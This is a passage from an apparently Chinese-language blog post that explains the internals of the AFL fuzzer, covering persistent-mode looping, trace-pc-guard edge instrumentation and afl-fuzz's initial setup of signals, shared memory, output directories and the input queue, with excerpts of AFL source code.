server将不再需要去fork出一个新的子进程去进行fuzz，只需要恢复之前的子进程继续执行，并设置child_stopped为0</li><li>因为我们是<strong>相当于重新执行一次程序</strong>，所以将<code>__afl_prev_loc</code>设置为0，并向共享内存的第一个元素写一个值，随后直接返回1，此时<code>while(__AFL_LOOP)</code>满足条件，于是执行一次fuzzAPI，然后因为是while循环，会再次进入<code>__AFL_LOOP</code>里，再次减少一次循环次数变成998，并发出信号暂停。</li><li>上述过程重复执行，直到第1000次执行时，先恢复执行，然后返回1，然后执行一次fuzzAPI，然后因为是while循环，会再次进入<code>__AFL_LOOP</code>里，再次减少一次循环次数变成0，此时循环次数cnt已经被减到0，就不会再发出信号暂停子进程，而是设置<code>__afl_area_ptr</code>指向一个无关数组<code>__afl_area_initial</code>，随后将子进程执行到结束。<ul><li><strong>这是因为程序依然会向后执行并触发到instrument，这会向<code>__afl_area_ptr</code>里写值，但是此时我们其实并没有执行<code>fuzzAPI</code>，我们并不想向共享内存里写值，于是将其指向一个无关数组，随意写值。同理，在deferred instrumentation模式里，在执行<code>__afl_manual_init</code>之前，也是向无关数组里写值，因为我们将fork点手动设置，就代表在这个fork点之前的path我们并不关心。</strong></li><li>重新整理一下上面的逻辑<ul><li>loop第一次执行的时候，会初始化，然后返回1，执行一次fuzzAPI，然后cnt会减到999，然后抛出信号暂停子进程。</li><li>loop第二次执行的时候，恢复执行，清空一些值，然后返回1，执行一次fuzzAPI，然后cnt会减到998，然后抛出信号暂停子进程。</li><li>loop第1000次执行的时候，恢复执行，清空一些值，然后返回1，执行一次fuzzAPI，然后cnt会减到0，然后就设置指向无关数组，返回0，while循环结束，程序也将执行结束。</li></ul></li></ul></li><li>此时fork server将不再收到SIGSTOP信号，于是child_stopped仍为0。</li><li>所以当AFL fuzz通知fork server再进行一次fuzz的时候，由于此时child_stopped为0，则fork server会先fork出一个子进程，然后后续过程和之前一样了。</li><li>有点绕，可以结合代码再读一下<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __afl_persistent_loop(<span class="keyword">unsigned</span> <span class="keyword">int</span> max_cnt) &#123;</span><br><span class="line">  <span class="keyword">static</span> u8  first_pass = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">static</span> u32 cycle_cnt;</span><br><span class="line">  <span class="keyword">if</span> (first_pass) &#123;</span><br><span class="line">    <span class="keyword">if</span> (is_persistent) &#123;</span><br><span class="line">      <span class="built_in">memset</span>(__afl_area_ptr, <span class="number">0</span>, MAP_SIZE);</span><br><span class="line">      __afl_area_ptr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">      __afl_prev_loc = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cycle_cnt  = max_cnt;</span><br><span class="line">    first_pass = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (is_persistent) &#123;</span><br><span class="line">    <span class="keyword">if</span> (--cycle_cnt) &#123;</span><br><span class="line">      raise(SIGSTOP);</span><br><span class="line">      __afl_area_ptr[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">      __afl_prev_loc = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      __afl_area_ptr = __afl_area_initial;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="trace-pc-guard-mode"><a href="#trace-pc-guard-mode" class="headerlink" title="trace-pc-guard mode"></a>trace-pc-guard mode</h4><p>要使用这个功能，需要先通过<code>AFL_TRACE_PC=1</code>来定义DUSE_TRACE_PC宏，从而在执行afl-clang-fast的时候传入<code>-fsanitize-coverage=trace-pc-guard</code>参数，来开启这个功能，和之前我们的插桩不同，开启了这个功能之后，我们不再是仅仅只对每个基本块插桩，而是对每条edge都进行了插桩。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifdef AFL_TRACE_PC</span><br><span class="line">  CFLAGS    +&#x3D; -DUSE_TRACE_PC&#x3D;1</span><br><span class="line">endif</span><br></pre></td></tr></table></figure><p><code>__sanitizer_cov_trace_pc_guard</code>这个函数将在每个edge调用，该函数利用函数参数guard指针所指向的uint32值来确定共享内存上所对应的地址。<br>每个edge上都有应该有其不同(但其实可能相同，原因下述)的guard值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __sanitizer_cov_trace_pc_guard(<span class="keyword">uint32_t</span>* guard) &#123;</span><br><span class="line">  __afl_area_ptr[*guard]++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这个guard指针的初始化在<code>__sanitizer_cov_trace_pc_guard_init</code>函数里，llvm会设置guard其首末分别为start和stop。<br>它会从第一个guard开始向后遍历，设置guard指向的值，这个值是通过<code>R(MAP_SIZE)</code>设置的，定义如下，所以如果我们的edge足够多，而<code>MAP_SIZE</code>不够大，就有可能重复，而这个加一是因为我们会把0当成一个特殊的值，其代表对这个edge不进行插桩。<br>这个init其实很有趣，我们可以打印输出一下<code>stop-start</code>的值，就代表了llvm发现的程序里总计的edge数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> R(x) (random() % (x))</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">  *(start++) = R(MAP_SIZE - <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (start &lt; <span class="built_in">stop</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (R(<span class="number">100</span>) &lt; inst_ratio) *start = R(MAP_SIZE - <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> *start = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    start++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="afl-fuzz长叙"><a href="#afl-fuzz长叙" class="headerlink" title="afl-fuzz长叙"></a>afl-fuzz长叙</h2><h3 id="初始配置"><a href="#初始配置" class="headerlink" title="初始配置"></a>初始配置</h3><h4 id="setup-signal-handlers"><a href="#setup-signal-handlers" class="headerlink" title="setup_signal_handlers"></a>setup_signal_handlers</h4><p>注册必要的信号处理函数</p><ul><li><a href="https://www.cnblogs.com/52php/p/5813867.html" target="_blank" rel="noopener">Linux进程间通信（一）：信号 signal()、sigaction()</a></li><li>SIGHUP/SIGINT/SIGTERM<ul><li>hangup/interrupt/software termination signal from kill</li><li>主要是”stop”的处理函数</li><li>handle_stop_sig<ul><li>设置stop_soon为1</li><li>如果child_pid存在，向其发送SIGKILL终止信号，从而被系统杀死。</li><li>如果forksrv_pid存在，向其发送SIGKILL终止信号</li></ul></li></ul></li><li>SIGALRM<ul><li>alarm clock</li><li>处理超时的情况</li><li>handle_timeout<ul><li>如果child_pid&gt;0，则设置child_timed_out为1，并kill掉child_pid</li><li>如果child_pid==-1，且forksrv_pid&gt;0，则设置child_timed_out为1，并kill掉forksrv_pid</li></ul></li></ul></li><li>SIGWINCH<ul><li>Window resize</li><li>处理窗口大小的变化信号</li><li>handle_resize<ul><li>设置clear_screen=1</li></ul></li></ul></li><li>SIGUSR1<ul><li>user defined signal 1，这个是留给用户自定义的信号</li><li>这里定义成skip request (SIGUSR1)</li><li>handle_skipreq<ul><li>设置skip_requested=1</li></ul></li></ul></li><li>SIGTSTP/SIGPIPE<ul><li>stop signal from tty/write on a pipe with no one to read it</li><li>不关心的一些信号</li><li>SIG_IGN</li></ul></li></ul><h4 id="check-asan-opts"><a href="#check-asan-opts" class="headerlink" title="check_asan_opts"></a>check_asan_opts</h4><p>check asan选项</p><ul><li>读取环境变量ASAN_OPTIONS和MSAN_OPTIONS，做一些检查</li></ul><h4 id="fix-up-sync"><a href="#fix-up-sync" class="headerlink" title="fix_up_sync"></a>fix_up_sync</h4><p>如果通过-M或者-S指定了sync_id，则更新out_dir和sync_dir的值</p><ul><li>设置sync_dir的值为out_dir</li><li>设置out_dir的值为<code>out_dir/sync_id</code></li></ul><h4 id="save-cmdline"><a href="#save-cmdline" class="headerlink" title="save_cmdline"></a>save_cmdline</h4><p>拷贝当前的命令行参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">00 ff 00 ff   55 00 00 00   buf-&gt; 2f 55 73 65   72 73 2f 73   │ ····U···&#x2F;Users&#x2F;s │</span><br><span class="line">61 6b 75 72   61 2f 67 69   74 73 6f 75   72 63 65 2f   │ akura&#x2F;gitsource&#x2F; │</span><br><span class="line">41 46 4c 2f   63 6d 61 6b   65 2d 62 75   69 6c 64 2d   │ AFL&#x2F;cmake-build- │</span><br><span class="line">64 65 62 75   67 2f 61 66   6c 2d 66 75   7a 7a 20 2d   │ debug&#x2F;afl-fuzz - │</span><br><span class="line">69 20 69 6e   70 75 74 20   2d 6f 20 6f   75 74 70 75   │ i input -o outpu │</span><br><span class="line">74 20 2d 2d   20 2e 2f 74   65 73 74 00   00 f0 00 00   │ t -- .&#x2F;test·····</span><br></pre></td></tr></table></figure><h4 id="fix-up-banner"><a href="#fix-up-banner" class="headerlink" title="fix_up_banner"></a>fix_up_banner</h4><p>修剪并且创建一个运行横幅</p><h4 id="check-if-tty"><a href="#check-if-tty" class="headerlink" title="check_if_tty"></a>check_if_tty</h4><p>检查是否在tty终端上面运行。</p><ul><li>读取环境变量AFL_NO_UI的值，如果为真，则设置not_on_tty为1，并返回</li><li><code>ioctl(1, TIOCGWINSZ, &amp;ws)</code>通过ioctl来读取window size，如果报错为ENOTTY，则代表当前不在一个tty终端运行，设置not_on_tty</li></ul><h4 id="get-core-count"><a href="#get-core-count" class="headerlink" title="get_core_count"></a>get_core_count</h4><p>计数logical CPU cores</p><h4 id="check-crash-handling"><a href="#check-crash-handling" class="headerlink" title="check_crash_handling"></a>check_crash_handling</h4><h4 id="check-cpu-governor"><a href="#check-cpu-governor" class="headerlink" title="check_cpu_governor"></a>check_cpu_governor</h4><h4 id="setup-post"><a href="#setup-post" class="headerlink" title="setup_post"></a>setup_post</h4><h4 id="setup-shm"><a href="#setup-shm" class="headerlink" title="setup_shm"></a>setup_shm</h4><p>配置共享内存和virgin_bits</p><ul><li><a href="https://www.cnblogs.com/52php/p/5861372.html" target="_blank" rel="noopener">Linux进程间通信（六）：共享内存 shmget()、shmat()、shmdt()、shmctl()</a></li><li>如果in_bitmap为空，则通过memset初始化数组virgin_bits[MAP_SIZE]的每个元素的值为’255’(\xff)</li><li>通过memset设置virgin_tmout[MAP_SIZE]和virgin_crash[MAP_SIZE]的每个元素的值为’255’(\xff)</li><li>调用shmget分配一块共享内存，<code>shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | 0600);</code>,将返回的共享内存标识符保存到shm_id里。<ul><li><code>int shmget(key_t key, size_t size, int shmflg);</code></li><li>第一个参数，程序需要提供一个参数key（非0整数），它有效地为共享内存段命名，shmget()函数成功时返回一个与key相关的共享内存标识符（非负整数），用于后续的共享内存函数。调用失败返回-1.<ul><li>这里shm_id取值是IPC_PRIVATE，所以函数shmget()将创建一块新的共享内存</li></ul></li><li>第二个参数，size以字节为单位指定需要共享的内存容量<ul><li>这里取值为MAP_SIZE</li></ul></li><li>第三个参数，shmflg是权限标志<ul><li>IPC_CREAT   如果共享内存不存在，则创建一个共享内存，否则打开操作。</li><li>IPC_EXCL     只有在共享内存不存在的时候，新的共享内存才建立，否则就产生错误。</li><li>421分别表示，读写执行3种权限。 比如，上面的6＝4＋2，表示读＋写。 </li><li>0600 每一位表示一种类型的权限，比如，第一位是表示八进制,第二位表示拥有者的权限为读写，第三位表示同组无权限，第四位表示他人无权限。</li></ul></li></ul></li><li>注册atexit handler为remove_shm<ul><li>remove_shm<ul><li>shmctl(shm_id, IPC_RMID, NULL);<ul><li>第一个参数，shm_id是shmget()函数返回的共享内存标识符。</li><li>第二个参数，command是要采取的操作，它可以取下面的三个值<ul><li>IPC_RMID：删除共享内存段</li></ul></li><li>第三个参数，buf是一个结构指针</li></ul></li></ul></li></ul></li><li>使用alloc_printf(“%d”, shm_id)来创建一个字符串shm_str<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00 ff 00 ff   06 00 00 00  shm_str-&gt;36 35 35 33   38 00 f0 f0   │ ········65538··· │</span><br></pre></td></tr></table></figure></li><li>如果不是dumb_mode，<strong>则设置环境变量SHM_ENV_VAR的值为shm_str</strong></li><li><code>trace_bits = shmat(shm_id, NULL, 0);</code><ul><li>trace_bits是用做<code>SHM with instrumentation bitmap</code></li><li>第一次创建完共享内存时，它还不能被任何进程访问，所以通过shmat来启动对该共享内存的访问，并把共享内存连接到当前进程的地址空间。</li><li><code>void *shmat(int shm_id, const void *shm_addr, int shmflg)</code><ul><li>第一个参数，shm_id是由shmget()函数返回的共享内存标识。</li><li>第二个参数，shm_addr指定共享内存连接到当前进程中的地址位置，通常为空，表示让系统来选择共享内存的地址。</li><li>第三个参数，shm_flg是一组标志位，通常为0。</li><li>调用成功时返回一个指向共享内存第一个字节的指针，如果调用失败返回-1.<h4 id="init-count-class16"><a href="#init-count-class16" class="headerlink" title="init_count_class16"></a>init_count_class16</h4>这其实是因为trace_bits是用一个字节来记录是否到达这个路径，和这个路径被命中了多少次的，而这个次数在0-255之间，但比如一个循环，它循环5次和循环6次可能是完全一样的效果，为了避免被当成不同的路径，或者说尽可能减少因为命中次数导致的区别。<br>在每次去计算是否发现了新路径之前，先把这个路径命中数进行规整，比如把命中5次和6次都统一认为是命中了8次，见下面这个。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> u8 count_class_lookup8[<span class="number">256</span>] = &#123;</span><br><span class="line">        [<span class="number">0</span>]           = <span class="number">0</span>,</span><br><span class="line">        [<span class="number">1</span>]           = <span class="number">1</span>,</span><br><span class="line">        [<span class="number">2</span>]           = <span class="number">2</span>,</span><br><span class="line">        [<span class="number">3</span>]           = <span class="number">4</span>,</span><br><span class="line">        [<span class="number">4</span> ... <span class="number">7</span>]     = <span class="number">8</span>,</span><br><span class="line">        [<span class="number">8</span> ... <span class="number">15</span>]    = <span class="number">16</span>,</span><br><span class="line">        [<span class="number">16</span> ... <span class="number">31</span>]   = <span class="number">32</span>,</span><br><span class="line">        [<span class="number">32</span> ... <span class="number">127</span>]  = <span class="number">64</span>,</span><br><span class="line">        [<span class="number">128</span> ... <span class="number">255</span>] = <span class="number">128</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>而为什么又需要用一个<code>count_class_lookup16</code>呢，是因为AFL在后面实际进行规整的时候，是一次读两个字节去处理的，为了提高效率，这只是出于效率的考量，实际效果还是上面这种效果。<br>初始化<code>u16 count_class_lookup16[65536]</code><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXP_ST <span class="keyword">void</span> <span class="title">init_count_class16</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    u32 b1, b2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (b1 = <span class="number">0</span>; b1 &lt; <span class="number">256</span>; b1++)</span><br><span class="line">        <span class="keyword">for</span> (b2 = <span class="number">0</span>; b2 &lt; <span class="number">256</span>; b2++)</span><br><span class="line">            count_class_lookup16[(b1 &lt;&lt; <span class="number">8</span>) + b2] =</span><br><span class="line">                    (count_class_lookup8[b1] &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">                    count_class_lookup8[b2];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h4 id="setup-dirs-fds"><a href="#setup-dirs-fds" class="headerlink" title="setup_dirs_fds"></a>setup_dirs_fds</h4><p>准备输出文件夹和fd</p><ul><li>如果sync_id存在，且创建sync_dir文件夹，设置权限为0700（读写执行）<ul><li>如果报错，且errno不是EEXIST，则抛出异常。</li></ul></li><li>创建out_dir，设置权限为0700（读写执行）<ul><li>如果报错，且errno不是EEXIST，则抛出异常。<ul><li>maybe_delete_out_dir</li></ul></li><li>如果创建成功<ul><li>如果设置了in_place_resume，就抛出异常”Resume attempted but old output directory not found”</li><li><code>out_dir_fd = open(out_dir, O_RDONLY)</code>以只读模式打开这个文件，并返回文件句柄out_dir_fd</li><li>如果没有定义宏<code>__sun</code><ul><li>如果打开out_dir失败，或者为out_dir通过flock建立互斥锁定失败，就抛出异常”Unable to flock() output directory.”</li></ul></li></ul></li></ul></li><li>建立queue文件夹<ul><li>创建<code>out_dir/queue</code>文件夹，设置权限为0700<ul><li>创建<code>out_dir/queue/.state/</code>,设置权限为0700,该文件夹主要<strong>保存用于session resume和related tasks的queue metadata</strong><ul><li>创建<code>out_dir/queue/.state/deterministic_done/</code>,设置权限为0700,该文件夹<strong>标记过去经历过deterministic fuzzing的queue entries</strong>。</li><li>创建<code>out_dir/queue/.state/auto_extras/</code>,设置权限为0700,<strong>Directory with the auto-selected dictionary entries.</strong></li><li>创建<code>out_dir/queue/.state/redundant_edges/</code>,设置权限为0700,<strong>保存当前被认为是多余的路径集合</strong></li><li>创建<code>out_dir/queue/.state/variable_behavior/</code>,设置权限为0700,<strong>The set of paths showing variable behavior.</strong></li></ul></li></ul></li></ul></li><li>如果sync_id存在<ul><li>创建<code>out_dir/.synced/</code>,设置权限为0700,<strong>同步文件夹，用于跟踪cooperating fuzzers.</strong></li></ul></li><li>建立crashes文件夹<ul><li>创建<code>out_dir/crashes</code>文件夹，设置权限为0700,用于记录crashes</li></ul></li><li>建立hangs文件夹<ul><li>创建<code>out_dir/hangs</code>文件夹，设置权限为0700,用于记录hangs</li></ul></li><li>通常有用的文件描述符<ul><li><code>dev_null_fd = open(&quot;/dev/null&quot;, O_RDWR);</code>以读写模式打开<code>/dev/null</code></li><li><code>dev_urandom_fd = open(&quot;/dev/urandom&quot;, O_RDONLY);</code>,以只读模式打开<code>/dev/urandom</code></li></ul></li><li>建立Gnuplot输出文件夹<ul><li><code>fd = open(tmp, O_WRONLY | O_CREAT | O_EXCL, 0600);</code>以只写方式打开<code>out_dir/plot_data</code>文件，如果文件不存在，就创建，并获取句柄</li><li><code>plot_file = fdopen(fd, &quot;w&quot;);</code>根据句柄得到FILE* plot_file</li><li>向其中写入<code># unix_time, cycles_done, cur_path, paths_total, pending_total, pending_favs, map_size, unique_crashes, unique_hangs, max_depth, execs_per_sec\n</code></li></ul></li></ul><h4 id="read-testcases"><a href="#read-testcases" class="headerlink" title="read_testcases"></a>read_testcases</h4><p>从输入文件夹中读取所有文件，然后将它们排队进行测试。</p><ul><li>尝试访问<code>in_dir/queue</code>文件夹，如果存在就重新设置in_dir为<code>in_dir/queue</code><ul><li>Auto-detect non-in-place resumption attempts.</li></ul></li><li>扫描in_dir，并将结果保存在<code>struct dirent **nl</code>里<ul><li>不使用readdir,因为测试用例的顺序将随机地有些变化,并且将难以控制。</li></ul></li><li>遍历nl,nl[i]-&gt;d_name的值为input文件夹下的文件名字符串<ul><li><code>u8 *fn = alloc_printf(&quot;%s/%s&quot;, in_dir, nl[i]-&gt;d_name);</code></li><li><code>u8 *dfn = alloc_printf(&quot;%s/.state/deterministic_done/%s&quot;, in_dir, nl[i]-&gt;d_name);</code></li><li>如果<code>shuffle_queue</code>的值为真，且nl_cnt大于1，则<code>shuffle_ptrs((void **) nl, nl_cnt)</code>，字面意思上就是重排nl里的指针的位置。</li><li>通过文件属性过滤掉<code>.</code>和<code>..</code>这样的regular文件，并检查文件大小，如果文件大小大于MAX_FILE，默认是1024*1024字节，即1M</li><li>通过access检查<code>in_dir/.state/deterministic_done/nl[i]-&gt;d_name</code>是否存在，这应该是为了用在resume恢复扫描使用<ul><li>如果存在就设置passed_det为1</li><li>这个检查是用来判断是否这个entry已完成deterministic fuzzing。在恢复异常终止的扫描时，我们不想重复deterministic fuzzing，因为这将毫无意义，而且可能非常耗时</li></ul></li><li>add_to_queue(fn, st.st_size, passed_det);</li><li>如果queued_paths为0，则代表输入文件夹为0，抛出异常</li><li>设置last_path_time为0</li><li>queued_at_start的值设置为queued_paths<ul><li>Total number of initial inputs</li></ul></li></ul></li></ul><h4 id="add-to-queue-u8-fname-u32-len-u8-passed-det"><a href="#add-to-queue-u8-fname-u32-len-u8-passed-det" class="headerlink" title="add_to_queue(u8 *fname, u32 len, u8 passed_det)"></a>add_to_queue(u8 *fname, u32 len, u8 passed_det)</h4><ul><li>queue_entry是一个链表数据结构</li><li>先通过calloc动态分配一个queue_entry结构体，并<strong>初始化其fname为文件名fn，len为文件大小，depth为cur_depth + 1,passed_det为传递进来的passed_det</strong><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">q-&gt;fname = fname;</span><br><span class="line">q-&gt;len = len;</span><br><span class="line">q-&gt;depth = cur_depth + <span class="number">1</span>;</span><br><span class="line">q-&gt;passed_det = passed_det;</span><br></pre></td></tr></table></figure></li><li>如果<code>q-&gt;depth &gt; max_depth</code>，则设置max_depth为q-&gt;depth</li><li>如果queue_top不为空，则设置<code>queue_top-&gt;next为q，queue_top = q;</code>，否则<code>q_prev100 = queue = queue_top = q;</code><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">queue_entry</span> *<span class="title">queue</span>,     /* <span class="title">Fuzzing</span> <span class="title">queue</span> (<span class="title">linked</span> <span class="title">list</span>)      */</span></span><br><span class="line"><span class="class">*<span class="title">queue_top</span>, /* <span class="title">Top</span> <span class="title">of</span> <span class="title">the</span> <span class="title">list</span>                  */</span></span><br><span class="line"><span class="class">*<span class="title">q_prev100</span>;</span> <span class="comment">/* Previous 100 marker              */</span></span><br></pre></td></tr></table></figure></li><li>queue计数器queued_paths和待fuzz的样例计数器pending_not_fuzzed加一</li><li>cycles_wo_finds设置为0<ul><li>Cycles without any new paths</li></ul></li><li>如果<code>queued_paths % 100</code>得到0，则设置<code>q_prev100-&gt;next_100 = q; q_prev100 = q;</code></li><li>设置last_path_time为当前时间。</li></ul><h4 id="load-auto"><a href="#load-auto" class="headerlink" title="load_auto"></a>load_auto</h4><p>load自动生成的提取出来的词典token</p><ul><li>遍历循环从i等于0到USE_AUTO_EXTRAS，默认50<ul><li>以只读模式尝试打开文件名为<code>alloc_printf(&quot;%s/.state/auto_extras/auto_%06u&quot;, in_dir, i)</code>的文件</li><li>如果打开失败，则结束</li><li>如果打开成功，则从fd读取最多<code>MAX_AUTO_EXTRA+1</code>个字节到tmp数组里，默认MAX_AUTO_EXTRA为32，这是单个auto extra文件的最大大小，读取出的长度保存到len里。</li><li>maybe_add_auto(tmp, len);<br>};</li></ul></li></ul><h4 id="maybe-add-auto-u8-mem-u32-len"><a href="#maybe-add-auto-u8-mem-u32-len" class="headerlink" title="maybe_add_auto(u8 *mem, u32 len)"></a>maybe_add_auto(u8 *mem, u32 len)</h4><ul><li>如果用户设置了MAX_AUTO_EXTRAS或者USE_AUTO_EXTRAS为0，则直接返回。</li><li>循环遍历i从1到len，将tmp[0]和mem[i]异或，如果相同，则结束循环。</li><li>如果结束时i=0，即tmp[0]和tmp[1]就相同，就直接返回。这里我推断tmp应该是从小到大排序的字节流。</li><li>如果len的长度为2，就和interesting_16数组里的元素比较，如果和其中某一个相同，就直接return。</li><li>如果len的长度为4，就和interesting_32数组里的元素比较，如果和其中某一个相同，就直接return。</li><li>将tmp和现有的extras数组里的元素比较，利用extras数组里保存的元素是按照size大小，从小到大排序这个特性，来优化代码。<ul><li>遍历extras数组，比较<code>memcmp_nocase(extras[i].data, mem, len)</code>,如果有一个相同，就直接return。</li><li>static struct extra_data <em>extras;     /</em> Extra tokens to fuzz with        */</li></ul></li><li>设置auto_changed为1</li><li>遍历a_extras数组，比较<code>memcmp_nocase(a_extras[i].data, mem, len)</code>,如果相同，就将其hit_cnt值加一，这是代表在语料中被use的次数,然后跳转到<code>sort_a_extras</code><ul><li>static struct extra_data <em>a_extras;   /</em> Automatically selected extras    */<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">extra_data</span> &#123;</span></span><br><span class="line">u8 *data;                           <span class="comment">/* Dictionary token data            */</span></span><br><span class="line">u32 len;                            <span class="comment">/* Dictionary token length          */</span></span><br><span class="line">u32 hit_cnt;                        <span class="comment">/* Use count in the corpus          */</span></span><br></pre></td></tr></table></figure></li></ul></li><li>此时我们可能在处理一个不在之前的任何a_extras或者extras数组里的新entry了，处理逻辑是<ul><li>先比较a_extras_cnt和MAX_AUTO_EXTRAS，如果小于就代表a_extras数组没有填满，直接拷贝tmp和len，来构造出一个新项，加入到a_extras数组里</li><li>否则的话，就从a_extras数组的后半部分里，随机替换掉一个元素的a_extras[i].data为ck_memdup(mem, len)，并将len设置为len，hit_cnt设置为0。</li></ul></li></ul><h4 id="pivot-inputs"><a href="#pivot-inputs" class="headerlink" title="pivot_inputs"></a>pivot_inputs</h4><p>逻辑上说这个函数就是为inputdir里的testcase，在output dir里创建hard link</p><ul><li>初始化id=0</li><li>依次遍历queue里的queue_entry<ul><li>在q-&gt;fname里找到最后一个’/‘所在的位置，如果找不到，则<code>rsl = q-&gt;fname</code>,否则rsl指向’/‘后的第一个字符,其实也就是最后一个<code>/</code>后面的字符串</li><li>将rsl的前三个字节和<code>id_</code>进行比较<ul><li>如果相等，则设置<code>resuming_fuzz</code>为1,然后做一些恢复操作，不叙述。</li><li>如果不相等<ul><li>在rsl里寻找<code>,orig:</code>子串，如果找到了，将use_name指向该子串的冒号后的名字；如果没找到，就另<code>use_name = rsl</code></li><li><code>nfn = alloc_printf(&quot;%s/queue/id:%06u,orig:%s&quot;, out_dir, id, use_name);</code></li><li>尝试创建从input file到<code>alloc_printf(&quot;%s/queue/id:%06u,orig:%s&quot;, out_dir, id, use_name)</code>的硬链接</li></ul></li></ul></li><li>修改q的fname指向这个硬链接</li><li>如果q的passed_det为1，则mark_as_det_done(q),这主要是对应上面的resuming_fuzz的情况。<ul><li>mark_as_det_done简单的说就是打开<code>out_dir/queue/.state/deterministic_done/use_name</code>这个文件，如果不存在就创建这个文件，然后设置q的passed_det为1。</li><li>这里的<code>use_name就是orig:后面的字符串</code></li></ul></li></ul></li><li>如果设置了in_place_resume为1，则nuke_resume_dir()<ul><li>nuke_resume_dir()<ul><li>删除<code>out_dir/_resume/.state/deterministic_done</code>文件夹下所有<code>id:</code>前缀的文件</li><li>删除<code>out_dir/_resume/.state/auto_extras</code>文件夹下所有<code>auto_</code>前缀的文件</li><li>删除<code>out_dir/_resume/.state/redundant_edges</code>文件夹下所有<code>id:</code>前缀的文件</li><li>删除<code>out_dir/_resume/.state/variable_behavior</code>文件夹下所有<code>id:</code>前缀的文件</li><li>删除文件夹<code>out_dir/_resume/.state</code></li><li>删除<code>out_dir/_resume</code>文件夹下所有<code>id:</code>前缀的文件</li><li>如果全部删除成功就正常返回，如果有某一个删除失败就抛出异常。</li></ul></li></ul></li></ul><h4 id="load-extras"><a href="#load-extras" class="headerlink" title="load_extras"></a>load_extras</h4><p>如果定义了extras_dir，则从extras_dir读取extras到extras数组里，并按size排序。</p><h4 id="find-timeout"><a href="#find-timeout" class="headerlink" title="find_timeout"></a>find_timeout</h4><p>如果timeout_given没有被设置，则进入find_timeout<br>这个想法是，在不指定-t的情况下resuming 